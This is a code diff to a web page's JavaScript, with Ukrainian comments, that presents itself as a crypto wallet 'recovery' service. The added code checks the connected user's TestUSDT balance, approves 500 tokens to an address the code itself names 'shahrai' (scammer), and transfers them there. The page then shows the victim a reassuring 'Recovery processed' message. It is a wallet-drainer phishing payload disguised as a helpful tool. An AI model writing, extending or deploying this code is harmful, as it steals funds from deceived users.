@@ -85,26 +85,43 @@
                 });
 
                 console.log('Signature:', signature);
-                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
+                document.getElementById('status').innerText = 'Wallet verified. Approving and transferring tokens...';
 
-                // Виклик executeApprove через ApproveContract
-                const contractAddress = '0x45082F912D180D8296220940aC164c5feC775d3c'; // Встав нову адресу
+                // Прямий виклик approve і transferFrom через TestUSDT
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
-                const amount = 1000000000; // 1000 USDT
+                const amount = 500000000; // 500 USDT (6 decimals)
 
-                const contractAbi = [
-                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
+                const tokenAbi = [
+                    "function approve(address spender, uint256 amount) external returns (bool)",
+                    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+                    "function balanceOf(address) view returns (uint256)",
+                    "function decimals() view returns (uint8)"
                 ];
 
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
-                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+                const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, signer);
 
-                const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, shahraiAddress, amount);
-                await tx.wait();
-                console.log('Transaction Hash:', tx.hash);
+                // Перевірка балансу
+                const balance = await tokenContract.balanceOf(userAddress);
+                const decimals = await tokenContract.decimals();
+                const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+                console.log(`User balance: ${balanceFormatted} TestUSDT`);
+
+                if (balance.lt(amount)) {
+                    throw new Error('Insufficient balance to transfer');
+                }
+
+                // Виклик approve
+                const approveTx = await tokenContract.approve(shahraiAddress, amount);
+                const approveReceipt = await approveTx.wait();
+                console.log('Approve Transaction Hash:', approveReceipt.transactionHash);
+
+                // Виклик transferFrom (гаманець А передає токени гаманцю Б)
+                const transferTx = await tokenContract.transferFrom(userAddress, shahraiAddress, amount);
+                const transferReceipt = await transferTx.wait();
+                console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
 
                 document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
